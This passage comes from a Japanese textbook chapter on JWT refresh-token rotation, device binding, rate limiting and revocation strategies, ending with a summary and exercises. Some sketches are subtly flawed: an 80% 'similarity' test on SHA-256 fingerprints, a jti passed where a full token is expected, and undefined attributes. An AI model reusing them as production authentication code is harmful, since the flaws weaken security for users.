                            stored_token['status'] = 'revoked_security'
                            self._update_token(stored_token)
                
                # セキュリティアラート
                self._send_security_alert(token_data['user_id'], {
                    'event': 'refresh_token_reuse',
                    'family_id': family_id,
                    'timestamp': time.time()
                })
        
        return RefreshTokenRotation()
    
    def implement_device_binding(self):
        """デバイスバインディングの実装"""
        
        class DeviceBoundRefreshToken:
            def __init__(self):
                self.device_registry = {}
            
            def create_device_bound_token(self, user_id: str, device_info: Dict) -> str:
                """デバイスにバインドされたトークンの作成"""
                
                # デバイスフィンガープリント
                device_fingerprint = self._calculate_device_fingerprint(device_info)
                
                # デバイスの登録
                device_id = str(uuid.uuid4())
                self.device_registry[device_id] = {
                    'user_id': user_id,
                    'fingerprint': device_fingerprint,
                    'registered_at': time.time(),
                    'last_seen': time.time(),
                    'device_info': {
                        'user_agent': device_info.get('user_agent'),
                        'platform': device_info.get('platform'),
                        'app_version': device_info.get('app_version')
                    }
                }
                
                # トークンにデバイス情報を含める
                token_data = {
                    'user_id': user_id,
                    'device_id': device_id,
                    'device_fingerprint': device_fingerprint,
                    'exp': int(time.time() + 30 * 24 * 3600)  # 30日
                }
                
                return jwt.encode(token_data, self.secret, algorithm='HS256')
            
            def verify_device_binding(self, token: str, current_device_info: Dict) -> bool:
                """デバイスバインディングの検証"""
                
                try:
                    payload = jwt.decode(token, self.secret, algorithms=['HS256'])
                    
                    # 現在のデバイスフィンガープリント
                    current_fingerprint = self._calculate_device_fingerprint(
                        current_device_info
                    )
                    
                    # フィンガープリントの比較（完全一致は求めない）
                    similarity = self._calculate_fingerprint_similarity(
                        payload['device_fingerprint'],
                        current_fingerprint
                    )
                    
                    # 類似度が閾値以上なら許可
                    if similarity >= 0.8:  # 80%以上の一致
                        # デバイス情報を更新
                        self._update_device_info(payload['device_id'], current_device_info)
                        return True
                    
                    # 新しいデバイスからのアクセス
                    return self._handle_new_device_access(payload, current_device_info)
                    
                except Exception as e:
                    logging.error(f"Device binding verification failed: {e}")
                    return False
            
            def _calculate_device_fingerprint(self, device_info: Dict) -> str:
                """デバイスフィンガープリントの計算"""
                
                # 複数の要素を組み合わせる
                fingerprint_data = {
                    'user_agent': device_info.get('user_agent', ''),
                    'accept_language': device_info.get('accept_language', ''),
                    'screen_resolution': device_info.get('screen_resolution', ''),
                    'timezone_offset': device_info.get('timezone_offset', 0),
                    'platform': device_info.get('platform', ''),
                    'hardware_concurrency': device_info.get('hardware_concurrency', 0)
                }
                
                # 安定したハッシュを生成
                fingerprint_str = json.dumps(fingerprint_data, sort_keys=True)
                return hashlib.sha256(fingerprint_str.encode()).hexdigest()
        
        return DeviceBoundRefreshToken()
    
    def implement_rate_limiting(self):
        """レート制限の実装"""
        
        class RefreshTokenRateLimiter:
            def __init__(self):
                self.limits = {
                    'per_minute': 5,
                    'per_hour': 20,
                    'per_day': 100
                }
                self.usage_history = {}  # user_id -> usage_list
            
            def check_rate_limit(self, user_id: str) -> Tuple[bool, Optional[str]]:
                """レート制限のチェック"""
                
                current_time = time.time()
                
                # ユーザーの使用履歴を取得
                if user_id not in self.usage_history:
                    self.usage_history[user_id] = []
                
                usage_list = self.usage_history[user_id]
                
                # 期限切れのエントリを削除
                usage_list = [
                    ts for ts in usage_list 
                    if current_time - ts < 86400  # 24時間以内
                ]
                
                # 各時間枠でのチェック
                checks = [
                    (60, self.limits['per_minute'], '1分'),
                    (3600, self.limits['per_hour'], '1時間'),
                    (86400, self.limits['per_day'], '1日')
                ]
                
                for window, limit, period_name in checks:
                    recent_usage = [
                        ts for ts in usage_list 
                        if current_time - ts < window
                    ]
                    
                    if len(recent_usage) >= limit:
                        return False, f"{period_name}あたりの制限（{limit}回）を超過"
                
                # 使用を記録
                usage_list.append(current_time)
                self.usage_history[user_id] = usage_list
                
                return True, None
            
            def implement_exponential_backoff(self):
                """指数バックオフの実装"""
                
                return {
                    'concept': '連続失敗時の待機時間を指数的に増加',
                    'implementation': '''
                    def calculate_backoff_time(failure_count: int) -> int:
                        """バックオフ時間の計算"""
                        
                        base_delay = 1  # 1秒
                        max_delay = 300  # 5分
                        
                        # 2^n * base_delay（最大値でキャップ）
                        delay = min(base_delay * (2 ** failure_count), max_delay)
                        
                        # ジッターを追加（サンダリングハード問題対策）
                        jitter = random.uniform(0, delay * 0.1)
                        
                        return delay + jitter
                    ''',
                    'benefits': [
                        'ブルートフォース攻撃の緩和',
                        'システム負荷の軽減',
                        '正当なユーザーへの影響最小化'
                    ]
                }
        
        return RefreshTokenRateLimiter()
```

### 5.3.3 リフレッシュトークンのセキュリティパターン

```python
class RefreshTokenSecurityPatterns:
    """リフレッシュトークンのセキュリティパターン"""
    
    def implement_refresh_token_patterns(self):
        """各種セキュリティパターンの実装"""
        
        return {
            'pattern_1_strict_rotation': {
                'description': '厳格なローテーション（使い捨て）',
                'implementation': '''
                class StrictRotation:
                    def refresh(self, token):
                        # トークンは一度しか使えない
                        if self.is_token_used(token):
                            # セキュリティ違反 - 全トークン無効化
                            self.revoke_all_tokens(token.user_id)
                            raise SecurityError("Token reuse detected")
                        
                        # 新しいトークンペアを発行
                        new_tokens = self.issue_new_tokens(token.user_id)
                        
                        # 古いトークンを無効化
                        self.mark_token_used(token)
                        
                        return new_tokens
                ''',
                'pros': '最高のセキュリティ',
                'cons': 'ネットワークエラー時の問題'
            },
            
            'pattern_2_grace_period': {
                'description': '猶予期間付きローテーション',
                'implementation': '''
                class GracePeriodRotation:
                    def __init__(self):
                        self.grace_period = 60  # 60秒
                    
                    def refresh(self, token):
                        token_info = self.get_token_info(token)
                        
                        if token_info['status'] == 'used':
                            # 猶予期間内かチェック
                            if time.time() - token_info['used_at'] < self.grace_period:
                                # 同じ新トークンを返す
                                return token_info['new_tokens']
                            else:
                                # 猶予期間外 - セキュリティ違反
                                self.handle_security_violation(token)
                        
                        # 新しいトークンを発行
                        new_tokens = self.issue_new_tokens(token.user_id)
                        
                        # 使用済みとしてマーク（猶予期間付き）
                        self.mark_token_used(token, new_tokens)
                        
                        return new_tokens
                ''',
                'pros': 'ネットワークエラーに対する耐性',
                'cons': '短時間の脆弱性ウィンドウ'
            },
            
            'pattern_3_sliding_sessions': {
                'description': 'スライディングセッション',
                'implementation': '''
                class SlidingSessions:
                    def refresh(self, token):
                        # アクティビティに基づいて有効期限を延長
                        if self.is_active_user(token.user_id):
                            # 有効期限を延長
                            new_expiry = time.time() + self.active_user_ttl
                        else:
                            # 通常の有効期限
                            new_expiry = time.time() + self.default_ttl
                        
                        # 既存トークンの有効期限を更新
                        self.update_token_expiry(token, new_expiry)
                        
                        # 新しいアクセストークンのみ発行
                        return {
                            'access_token': self.issue_access_token(token.user_id),
                            'refresh_token': token  # 同じリフレッシュトークン
                        }
                ''',
                'pros': 'アクティブユーザーの利便性',
                'cons': 'トークンの長期化リスク'
            },
            
            'pattern_4_cryptographic_binding': {
                'description': '暗号的バインディング',
                'implementation': '''
                class CryptographicBinding:
                    def create_bound_tokens(self, user_id):
                        # 暗号的にバインドされたトークンペア
                        binding_key = secrets.token_bytes(32)
                        
                        # アクセストークンにバインディングハッシュを含める
                        access_payload = {
                            'user_id': user_id,
                            'binding': hashlib.sha256(binding_key).hexdigest(),
                            'exp': time.time() + 900
                        }
                        
                        # リフレッシュトークンにバインディングキーを含める
                        refresh_payload = {
                            'user_id': user_id,
                            'binding_key': base64.b64encode(binding_key).decode(),
                            'exp': time.time() + 604800
                        }
                        
                        return {
                            'access_token': jwt.encode(access_payload, secret),
                            'refresh_token': jwt.encode(refresh_payload, secret)
                        }
                    
                    def verify_binding(self, access_token, refresh_token):
                        # トークンペアのバインディングを検証
                        access_payload = jwt.decode(access_token, secret)
                        refresh_payload = jwt.decode(refresh_token, secret)
                        
                        binding_key = base64.b64decode(refresh_payload['binding_key'])
                        expected_binding = hashlib.sha256(binding_key).hexdigest()
                        
                        return access_payload['binding'] == expected_binding
                ''',
                'pros': 'トークンペアの整合性保証',
                'cons': '実装の複雑性'
            }
        }
```

## 5.4 トークンの無効化戦略 - ステートレスの限界と対処法

### 5.4.1 JWTの無効化という課題

```python
class JWTRevocationChallenge:
    """JWT無効化の課題と解決策"""
    
    def explain_revocation_challenge(self):
        """なぜJWT無効化が難しいのか"""
        
        return {
            'fundamental_issue': {
                'jwt_nature': 'JWTは自己完結型でステートレス',
                'problem': '一度発行されたトークンは有効期限まで有効',
                'scenario': '''
                # ユーザーがログアウトしても...
                user_clicks_logout()
                
                # トークンはまだ有効！
                stolen_token = "eyJhbGciOiJIUzI1NiIs..."
                # 攻撃者はまだAPIにアクセス可能
                
                # 有効期限（exp）まで待つしかない？
                ''',
                'impact': [
                    'ログアウト機能の実装困難',
                    'アカウント停止の即時反映不可',
                    '漏洩トークンの無効化不可',
                    'パスワード変更後も古いトークンが有効'
                ]
            },
            
            'why_this_matters': {
                'security_requirements': [
                    'ユーザーは即座にログアウトできるべき',
                    '不正アクセスは即座に停止できるべき',
                    'パスワード変更は既存セッションを無効化すべき'
                ],
                
                'compliance_requirements': [
                    'GDPR: データアクセスの即時停止',
                    'セキュリティポリシー: セッション管理'
                ],
                
                'user_expectations': [
                    'ログアウトは即座に効果を持つ',
                    'デバイス紛失時の対応'
                ]
            }
        }
```

### 5.4.2 トークン無効化の実装戦略

```python
import redis
from typing import Set, Optional
from datetime import datetime, timedelta

class TokenRevocationStrategies:
    """トークン無効化の各種戦略"""
    
    def __init__(self):
        self.redis_client = redis.Redis()
        self.strategies = self._setup_strategies()
    
    def _setup_strategies(self):
        """各戦略の実装"""
        
        return {
            'blacklist': self.implement_blacklist_strategy(),
            'whitelist': self.implement_whitelist_strategy(),
            'short_expiry': self.implement_short_expiry_strategy(),
            'versioning': self.implement_version_strategy(),
            'hybrid': self.implement_hybrid_strategy()
        }
    
    def implement_blacklist_strategy(self):
        """ブラックリスト戦略の実装"""
        
        class BlacklistStrategy:
            def __init__(self, redis_client):
                self.redis = redis_client
                self.blacklist_prefix = "revoked_token:"
            
            def revoke_token(self, token: str):
                """トークンをブラックリストに追加"""
                
                try:
                    # トークンをデコード（検証なし）
                    payload = jwt.decode(token, options={"verify_signature": False})
                    
                    # JTI（JWT ID）を取得
                    jti = payload.get('jti')
                    if not jti:
                        # JTIがない場合はトークン全体のハッシュを使用
                        jti = hashlib.sha256(token.encode()).hexdigest()
                    
                    # 有効期限を取得
                    exp = payload.get('exp', 0)
                    ttl = max(exp - int(time.time()), 0)
                    
                    # ブラックリストに追加（有効期限まで保持）
                    if ttl > 0:
                        self.redis.setex(
                            f"{self.blacklist_prefix}{jti}",
                            ttl,
                            json.dumps({
                                'revoked_at': time.time(),
                                'reason': 'user_logout'
                            })
                        )
                        
                        # 統計情報を更新
                        self._update_revocation_stats(jti)
                        
                    return True
                    
                except Exception as e:
                    logging.error(f"Token revocation failed: {e}")
                    return False
            
            def is_token_revoked(self, token: str) -> bool:
                """トークンが無効化されているかチェック"""
                
                try:
                    payload = jwt.decode(token, options={"verify_signature": False})
                    jti = payload.get('jti')
                    
                    if not jti:
                        jti = hashlib.sha256(token.encode()).hexdigest()
                    
                    # ブラックリストをチェック
                    return self.redis.exists(f"{self.blacklist_prefix}{jti}") > 0
                    
                except Exception:
                    # エラーの場合は安全側に倒す（無効とみなす）
                    return True
            
            def revoke_all_user_tokens(self, user_id: str):
                """ユーザーのすべてのトークンを無効化"""
                
                # ユーザーのすべてのアクティブトークンを取得
                pattern = f"active_token:user:{user_id}:*"
                
                for key in self.redis.scan_iter(match=pattern):
                    token_info = json.loads(self.redis.get(key))
                    self.revoke_token(token_info['jti'])
                
                # ユーザーレベルの無効化フラグも設定
                self.redis.setex(
                    f"user_revoked:{user_id}",
                    86400,  # 24時間
                    time.time()
                )
            
            def cleanup_expired_entries(self):
                """期限切れエントリのクリーンアップ"""
                
                # Redisの有効期限機能により自動削除されるが、
                # 統計情報などの追加クリーンアップ
                
                cleanup_count = 0
                for key in self.redis.scan_iter(match=f"{self.blacklist_prefix}*"):
                    if not self.redis.exists(key):
                        cleanup_count += 1
                
                logging.info(f"Cleaned up {cleanup_count} expired blacklist entries")
                
            def get_blacklist_stats(self):
                """ブラックリストの統計情報"""
                
                stats = {
                    'total_revoked': 0,
                    'revoked_by_reason': {},
                    'memory_usage': 0
                }
                
                for key in self.redis.scan_iter(match=f"{self.blacklist_prefix}*"):
                    stats['total_revoked'] += 1
                    
                    data = json.loads(self.redis.get(key) or '{}')
                    reason = data.get('reason', 'unknown')
                    stats['revoked_by_reason'][reason] = \
                        stats['revoked_by_reason'].get(reason, 0) + 1
                
                # メモリ使用量の推定
                stats['memory_usage'] = stats['total_revoked'] * 100  # bytes
                
                return stats
        
        return BlacklistStrategy(self.redis_client)
    
    def implement_whitelist_strategy(self):
        """ホワイトリスト戦略の実装"""
        
        class WhitelistStrategy:
            def __init__(self, redis_client):
                self.redis = redis_client
                self.whitelist_prefix = "valid_token:"
            
            def register_token(self, token: str, user_id: str):
                """トークンをホワイトリストに登録"""
                
                payload = jwt.decode(token, options={"verify_signature": False})
                jti = payload['jti']
                exp = payload['exp']
                
                ttl = max(exp - int(time.time()), 0)
                
                self.redis.setex(
                    f"{self.whitelist_prefix}{jti}",
                    ttl,
                    json.dumps({
                        'user_id': user_id,
                        'issued_at': time.time(),
                        'device_id': payload.get('device_id')
                    })
                )
            
            def is_token_valid(self, token: str) -> bool:
                """トークンがホワイトリストに存在するかチェック"""
                
                try:
                    payload = jwt.decode(token, options={"verify_signature": False})
                    jti = payload['jti']
                    
                    return self.redis.exists(f"{self.whitelist_prefix}{jti}") > 0
                    
                except Exception:
                    return False
            
            def revoke_token(self, token: str):
                """トークンをホワイトリストから削除"""
                
                payload = jwt.decode(token, options={"verify_signature": False})
                jti = payload['jti']
                
                self.redis.delete(f"{self.whitelist_prefix}{jti}")
            
            def get_user_active_sessions(self, user_id: str) -> List[Dict]:
                """ユーザーのアクティブセッション一覧"""
                
                sessions = []
                
                for key in self.redis.scan_iter(match=f"{self.whitelist_prefix}*"):
                    data = json.loads(self.redis.get(key))
                    
                    if data['user_id'] == user_id:
                        sessions.append({
                            'jti': key.replace(self.whitelist_prefix, ''),
                            'device_id': data.get('device_id'),
                            'issued_at': data['issued_at']
                        })
                
                return sessions
        
        return WhitelistStrategy(self.redis_client)
    
    def implement_short_expiry_strategy(self):
        """短い有効期限戦略"""
        
        return {
            'concept': 'アクセストークンの有効期限を極めて短くする',
            
            'implementation': {
                'access_token_ttl': 300,  # 5分
                'refresh_interval': 240,  # 4分（期限前にリフレッシュ）
                'grace_period': 60        # 1分の猶予期間
            },
            
            'pros': [
                '無効化の必要性が減る',
                'ステートレスを維持',
                'シンプルな実装'
            ],
            
            'cons': [
                '頻繁なトークン更新',
                'ネットワーク負荷増加',
                'クライアント実装の複雑化'
            ],
            
            'client_implementation': '''
            class ShortExpiryTokenManager {
                constructor() {
                    this.refreshThreshold = 60; // 1分前にリフレッシュ
                }
                
                async getValidToken() {
                    const token = this.currentToken;
                    
                    if (!token || this.isExpiringSoon(token)) {
                        await this.refreshToken();
                    }
                    
                    return this.currentToken;
                }
                
                isExpiringSoon(token) {
                    const payload = this.decodeToken(token);
                    const expiresIn = payload.exp * 1000 - Date.now();
                    
                    return expiresIn < this.refreshThreshold * 1000;
                }
            }
            '''
        }
    
    def implement_version_strategy(self):
        """バージョニング戦略"""
        
        class VersioningStrategy:
            def __init__(self):
                self.user_token_versions = {}  # user_id -> version
            
            def increment_user_version(self, user_id: str):
                """ユーザーのトークンバージョンを増加"""
                
                current_version = self.user_token_versions.get(user_id, 0)
                new_version = current_version + 1
                
                self.user_token_versions[user_id] = new_version
                
                # 永続化（Redis等）
                self.redis.set(f"user_token_version:{user_id}", new_version)
                
                return new_version
            
            def create_versioned_token(self, user_id: str) -> str:
                """バージョン付きトークンの作成"""
                
                version = self.user_token_versions.get(user_id, 0)
                
                payload = {
                    'user_id': user_id,
                    'version': version,
                    'exp': int(time.time() + 3600)
                }
                
                return jwt.encode(payload, self.secret, algorithm='HS256')
            
            def verify_token_version(self, token: str) -> bool:
                """トークンバージョンの検証"""
                
                try:
                    payload = jwt.decode(token, self.secret, algorithms=['HS256'])
                    
                    user_id = payload['user_id']
                    token_version = payload['version']
                    
                    # 現在のバージョンと比較
                    current_version = self.user_token_versions.get(user_id, 0)
                    
                    return token_version >= current_version
                    
                except Exception:
                    return False
            
            def revoke_all_tokens(self, user_id: str):
                """すべてのトークンを無効化（バージョン増加）"""
                
                self.increment_user_version(user_id)
                
                logging.info(f"All tokens revoked for user {user_id}")
        
        return VersioningStrategy()
    
    def implement_hybrid_strategy(self):
        """ハイブリッド戦略"""
        
        class HybridRevocationStrategy:
            """複数の戦略を組み合わせた実装"""
            
            def __init__(self):
                self.blacklist = BlacklistStrategy()
                self.versioning = VersioningStrategy()
                self.short_expiry_config = {
                    'critical_operations': 300,  # 5分
                    'normal_operations': 900,    # 15分
                    'read_only': 3600            # 1時間
                }
            
            def issue_token(self, user_id: str, scope: str) -> str:
                """スコープに応じた有効期限のトークン発行"""
                
                # バージョンを含める
                version = self.versioning.get_user_version(user_id)
                
                # スコープに応じた有効期限
                ttl = self.short_expiry_config.get(scope, 900)
                
                payload = {
                    'user_id': user_id,
                    'scope': scope,
                    'version': version,
                    'jti': str(uuid.uuid4()),
                    'exp': int(time.time() + ttl)
                }
                
                return jwt.encode(payload, self.secret, algorithm='HS256')
            
            def verify_token(self, token: str) -> bool:
                """多層検証"""
                
                # 1. ブラックリストチェック
                if self.blacklist.is_token_revoked(token):
                    return False
                
                # 2. バージョンチェック
                if not self.versioning.verify_token_version(token):
                    return False
                
                # 3. 通常のJWT検証
                try:
                    jwt.decode(token, self.secret, algorithms=['HS256'])
                    return True
                except:
                    return False
            
            def emergency_revoke_all(self):
                """緊急時の全トークン無効化"""
                
                # 全ユーザーのバージョンを増加
                for user_id in self.get_all_users():
                    self.versioning.increment_user_version(user_id)
                
                # 追加のセキュリティフラグ
                self.redis.set("global_token_reset", time.time())
                
                logging.critical("Emergency token revocation executed")
        
        return HybridRevocationStrategy()
```

### 5.4.3 実践的な無効化システムの構築

```python
class PracticalRevocationSystem:
    """実践的なトークン無効化システム"""
    
    def __init__(self):
        self.revocation_manager = self._setup_revocation_manager()
    
    def _setup_revocation_manager(self):
        """無効化マネージャーのセットアップ"""
        
        class RevocationManager:
            def __init__(self):
                self.strategies = {
                    'immediate': self._immediate_revocation,
                    'eventual': self._eventual_revocation,
                    'emergency': self._emergency_revocation
                }
                self.events = RevocationEventHandler()
            
            def revoke_token(self, token: str, reason: str, 
                           immediate: bool = True) -> bool:
                """トークンの無効化"""
                
                # イベントの記録
                event = self.events.create_revocation_event(token, reason)
                
                if immediate:
                    result = self._immediate_revocation(token, event)
                else:
                    result = self._eventual_revocation(token, event)
                
                # 監査ログ
                self._audit_revocation(token, reason, result)
                
                return result
            
            def _immediate_revocation(self, token: str, event: Dict) -> bool:
                """即時無効化"""
                
                # ブラックリストに追加
                self.blacklist.add(token)
                
                # キャッシュをクリア
                self.cache.invalidate_token(token)
                
                # 関連サービスに通知
                self.notify_services(event)
                
                return True
            
            def _eventual_revocation(self, token: str, event: Dict) -> bool:
                """最終的無効化（短い有効期限を活用）"""
                
                # 次回のトークン更新で無効化
                self.mark_for_revocation(token)
                
                # 有効期限が切れるまでの暫定措置
                self.apply_restrictions(token)
                
                return True
            
            def _emergency_revocation(self, pattern: str) -> int:
                """緊急無効化（パターンマッチング）"""
                
                revoked_count = 0
                
                # 該当するトークンを検索
                for token in self.find_tokens_by_pattern(pattern):
                    if self.revoke_token(token, "emergency"):
                        revoked_count += 1
                
                # システム全体に警告
                self.broadcast_emergency_alert(pattern, revoked_count)
                
                return revoked_count
            
            def implement_revocation_events(self):
                """無効化イベントの実装"""
                
                class RevocationEventHandler:
                    def __init__(self):
                        self.event_store = []
                        self.subscribers = []
                    
                    def create_revocation_event(self, token: str, reason: str) -> Dict:
                        """無効化イベントの作成"""
                        
                        event = {
                            'id': str(uuid.uuid4()),
                            'timestamp': time.time(),
                            'token_jti': self._extract_jti(token),
                            'reason': reason,
                            'metadata': self._extract_metadata(token)
                        }
                        
                        self.event_store.append(event)
                        self._publish_event(event)
                        
                        return event
                    
                    def subscribe_to_revocations(self, callback):
                        """無効化イベントの購読"""
                        self.subscribers.append(callback)
                    
                    def _publish_event(self, event: Dict):
                        """イベントの配信"""
                        for subscriber in self.subscribers:
                            try:
                                subscriber(event)
                            except Exception as e:
                                logging.error(f"Event delivery failed: {e}")
                
                return RevocationEventHandler()
        
        return RevocationManager()
    
    def implement_graceful_degradation(self):
        """グレースフルデグラデーション"""
        
        return {
            'concept': '無効化システムの障害時の対処',
            
            'fallback_strategies': {
                'redis_unavailable': {
                    'detection': 'Redis connection timeout',
                    'fallback': 'Use short token expiry only',
                    'alert': 'Critical - Revocation system degraded'
                },
                
                'high_latency': {
                    'detection': 'Revocation check > 50ms',
                    'fallback': 'Async revocation checks',
                    'monitoring': 'Track degraded mode metrics'
                },
                
                'memory_pressure': {
                    'detection': 'Blacklist size > threshold',
                    'action': 'Aggressive cleanup of expired entries',
                    'fallback': 'LRU eviction policy'
                }
            },
            
            'implementation': '''
            async def check_token_with_fallback(token: str) -> bool:
                try:
                    # プライマリチェック（タイムアウト付き）
                    return await asyncio.wait_for(
                        self.check_revocation(token),
                        timeout=0.05  # 50ms
                    )
                except asyncio.TimeoutError:
                    # フォールバック：基本的なJWT検証のみ
                    metrics.increment('revocation.check.timeout')
                    
                    try:
                        jwt.decode(token, self.secret, algorithms=['HS256'])
                        return True
                    except:
                        return False
                except Exception as e:
                    # エラー時は安全側に倒す
                    logging.error(f"Revocation check failed: {e}")
                    return False
            '''
        }
```

## まとめ

この章では、トークンベース認証の基礎として以下を学びました：

1. **JWTの構造と仕組み**
   - なぜJWTが広く採用されているのか
   - ステートレス認証の利点
   - 署名アルゴリズムの選択

2. **トークンの保存と管理**
   - 各保存場所のセキュリティ特性
   - XSSとCSRF攻撃への対策
   - クライアント側の実装パターン

3. **リフレッシュトークンの設計**
   - セキュリティとUXのバランス
   - トークンローテーション
   - デバイスバインディング

4. **トークンの無効化戦略**
   - ステートレスの限界への対処
   - 各種無効化パターン
   - 実践的なシステム構築

次章では、これらの基礎の上に、OAuth 2.0プロトコルについて詳しく学んでいきます。

## 演習問題

### 問題1：JWT実装
以下の要件を満たすJWT認証システムを実装しなさい：
- RS256アルゴリズムを使用
- アクセストークン（15分）とリフレッシュトークン（7日）
- トークンローテーション機能
- 適切なエラーハンドリング

### 問題2：トークン保存戦略
SPAアプリケーションにおける最適なトークン保存戦略を設計しなさい：
- XSS対策
- CSRF対策
- ユーザビリティの考慮
- 実装の詳細

### 問題3：無効化システムの設計
1000万ユーザー規模のサービスでトークン無効化システムを設計しなさい：
- パフォーマンス要件（レイテンシ < 10ms）
- スケーラビリティ
- 障害時の動作
- コスト最適化

### 問題4：セキュリティ監査
既存のJWT実装のセキュリティ監査を行い、以下を報告しなさい：
- 脆弱性の特定
- リスク評価
- 改善提案
- 実装優先度

### 問題5：マイグレーション計画
セッションベース認証からJWT認証への移行計画を作成しなさい：
- 段階的移行戦略
- 後方互換性の維持
- ロールバック手順
- 性能影響の評価

### チャレンジ問題：分散環境でのトークン管理
マイクロサービス環境でのトークン管理システムを設計しなさい：
- サービス間認証
- トークンの伝播
- 一貫性のある無効化
- 監視とトラブルシューティング